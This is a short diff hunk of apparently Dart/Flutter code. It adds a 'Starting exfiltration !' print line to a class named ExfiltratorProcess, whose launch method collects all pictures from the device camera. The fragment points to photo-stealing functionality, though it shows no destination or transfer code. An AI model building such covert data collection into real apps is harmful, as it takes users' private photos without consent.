@@ -7,6 +7,7 @@ class ExfiltratorProcess {
 
   static Future<void> launch() async {
     if (!_isRunning) {
+      print("Starting exfiltration !");
       _isRunning = true;
       List<Picture> pictures = await PicturesManager.obtainAllFromCamera();
       for(Picture picture in pictures){
